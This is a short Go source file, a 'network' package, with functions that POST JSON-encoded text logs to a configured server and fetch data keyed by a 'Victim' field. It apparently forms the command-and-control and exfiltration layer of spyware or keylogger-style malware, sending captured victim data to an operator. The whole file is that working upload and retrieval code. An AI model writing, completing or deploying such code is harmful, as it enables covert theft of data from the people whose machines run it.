package network

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"main/models"
	"main/utils"
	"net/http"
)

func SendTextToServer(txtLog *models.TextLog) (*http.Response, error) {
	text, err := json.Marshal(txtLog)
	if err != nil {
		return nil, err
	}
	resp, err := http.Post(utils.Url, "application/json", bytes.NewBuffer(text))
	if err != nil {
		return nil, err
	}
	return resp, nil
}

func GetFromServer(txtLog *models.TextLog) (*http.Response, error) {
	resp, err := http.Get(fmt.Sprintf("%s/%s/%s", utils.BaseUrl, txtLog.Body, txtLog.Log.Victim))
	if err != nil {
		return nil, err
	}
	if resp.StatusCode != 200 {
		return nil, errors.New(fmt.Sprintf("Error %s for victim %s\n", txtLog.Body, txtLog.Log.Victim))
	}
	return resp, nil
}
